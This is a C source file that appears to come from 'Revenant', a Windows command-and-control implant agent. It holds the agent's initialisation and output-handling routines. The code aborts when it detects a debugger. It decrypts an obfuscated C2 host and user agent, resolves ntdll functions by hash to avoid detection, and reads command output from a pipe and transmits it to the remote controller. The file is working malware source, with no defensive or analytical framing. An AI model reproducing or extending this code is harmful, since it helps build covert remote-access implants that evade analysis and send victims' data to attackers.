#include "Asm.h"
#include "Core.h"
#include "Config.h"
#include "Poly.h"
#include "Package.h"
#include "Command.h"
#include "Revenant.h"
#include "AntiDebug.h"
#include "Utilities.h"
#include "Obfuscation.h"

VOID RvntInit() {

    if(IsDebugged()){
        return;
    }

    // Init Connection info
    // UserAgent and Host IP always obfuscated
    UCHAR s_xk[]        = S_XK;
    UCHAR e_UserAgent[] = CONFIG_USER_AGENT;
    UCHAR e_Host[]      = CONFIG_HOST;

    UCHAR d_UserAgent[sizeof(e_UserAgent)] = {0};
    UCHAR d_Host[sizeof(e_Host)] = {0};

    ROL_AND_DECRYPT((PUCHAR)e_UserAgent, sizeof(e_UserAgent), 1, d_UserAgent, (PCCH) s_xk);
    ROL_AND_DECRYPT((PUCHAR)e_Host, sizeof(e_Host), 1, d_Host, (PCCH) s_xk);

    PWCHAR w_UserAgent = NULL;
    PWCHAR w_Host = NULL;

    w_UserAgent = str_to_wide( (PCCH) d_UserAgent);
    w_Host = str_to_wide((PCCH) d_Host);

    Instance.Config.Transport.UserAgent = w_UserAgent;
    Instance.Config.Transport.Host      = w_Host;
    Instance.Config.Transport.Port      = CONFIG_PORT;
    Instance.Config.Transport.Secure    = CONFIG_SECURE;

    // Init Win32
#if CONFIG_ARCH == 64
    PVOID ntdll_base = get_ntdll_64();
#else
    PVOID ntdll_base = get_ntdll_32();
#endif
    // _tprintf("NTDLL_BASE: %x\n", ntdll_base);
    Instance.Win32.RtlRandomEx   = GetProcAddressByHash(ntdll_base, RtlRandomEx_CRC32B);
    Instance.Win32.RtlGetVersion = GetProcAddressByHash(ntdll_base, RtlGetVersion_CRC32B);

    Instance.Session.AgentID = RandomNumber32();
    Instance.Config.Sleeping = CONFIG_SLEEP;

    // _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
    // _tprintf( "Magic Value => %x\n", RVNT_MAGIC_VALUE );

    // TODO: Obfuscate this
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);

    Instance.Session.OSArch = si.wProcessorArchitecture;

    Instance.Session.ProcArch = PROCESS_AGENT_ARCH ;
}

VOID AnonPipeRead( HANDLE hSTD_OUT_Read ) {
    PPACKAGE Package         = NULL;
    LPVOID   pOutputBuffer   = NULL;
    UCHAR    buf[ 1025 ]     = { 0 };
    DWORD    dwBufferSize    = 0;
    DWORD    dwRead          = 0;
    BOOLEAN  SuccessFul      = FALSE;

    pOutputBuffer = LocalAlloc( LPTR, sizeof(LPVOID) );

    do {
        SuccessFul = ReadFile( hSTD_OUT_Read, buf, 1024, &dwRead, NULL );
        if ( dwRead == 0) {
            break;
        }

        pOutputBuffer = LocalReAlloc(
                pOutputBuffer,
                dwBufferSize + dwRead,
                LMEM_MOVEABLE | LMEM_ZEROINIT
        );

        dwBufferSize += dwRead;
        mem_cpy( pOutputBuffer + ( dwBufferSize - dwRead ), buf, dwRead );
        mem_set( buf, 0, dwRead );
    } while ( SuccessFul == TRUE );

    Package = PackageCreate( COMMAND_OUTPUT );

    PackageAddBytes( Package, pOutputBuffer, dwBufferSize );
    PackageTransmit( Package, NULL, NULL );
    mem_set( pOutputBuffer, 0, dwBufferSize );
    LocalFree( pOutputBuffer );
    pOutputBuffer = NULL;
}

ULONG RandomNumber32(void) {
    ULONG Seed = 0;

    Seed = GetTickCount();
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = Instance.Win32.RtlRandomEx( &Seed );
    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;

    return Seed % 2 == 0 ? Seed : Seed + 1;
}
